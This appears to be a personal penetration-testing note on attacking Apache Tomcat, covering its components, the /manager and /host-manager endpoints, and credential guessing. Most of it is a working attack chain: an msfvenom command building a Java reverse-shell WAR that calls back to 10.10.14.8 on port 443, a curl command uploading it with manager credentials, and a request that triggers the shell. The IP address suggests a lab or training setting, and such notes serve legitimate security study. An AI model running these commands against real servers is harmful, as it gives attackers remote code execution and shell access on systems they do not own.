---
tags:
  - hack
---
# Attacking Tomcat

Apache Tomcat is a Java-based web application stack that was very popular 20 years ago and is still used in legacy environments where applications have been built on Jakarta Server Pages (JSP), also known as JavaServer Pages. Tomcat is three components: Catalina, the servlet container, Coyote, its HTTP connector, and Jasper which is the core JSP engine. Tomcat is still under active development in 2024.

## Privileged Endpoints

The `/manager` and `/host-manager` endpoints are special. The first one can be used to upload a malicious web application archive, or WAR file. Guessing common credentials can easily lead to RCE. If the system has a Local File Inclusion (LFI) vulnerability, plaintext credentials for one or both of those administrative endpoints are potentially readable.

## Remote Code Execution

### Web Application Archive (WAR) File

With credentials for the `/manager` endpoint, an attacker may upload a malicious Web Application Archive (WAR) file. Such a file can easily be generated using `msfvenom`, as in this example:

```console
$ msfvenom -p java/shell_reverse_tcp lhost=10.10.14.8 lport=443 -f war -o hax.war
Payload size: 13030 bytes
Final size of war file: 13030 bytes
Saved as: hax.war
```

### Uploading a WAR File

This file can be uploaded from the command line, assuming valid credentials for the `/manager/text` endpoint:

```console
$ curl -u 'tomcat:$3cureP4s5w0rd123!' http://target:8080/manager/text/deploy?path=/hax --upload-file hax.war
OK - Deployed application at context path [/hax]

```

Then, trigger the reverse shell:

```text
$ curl http://target:8080/hax
```
